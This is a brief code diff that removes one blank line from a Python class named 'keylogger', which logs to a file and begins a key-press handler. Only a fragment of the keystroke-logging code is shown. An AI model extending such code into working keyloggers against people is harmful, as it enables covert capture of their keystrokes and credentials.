@@ -4,7 +4,6 @@ from .utilities.keylogger_utils import *
 
 class keylogger:
     def start(logfile_path, allow_print):
-
         logging.basicConfig(filename=logfile_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
         def on_press(key):
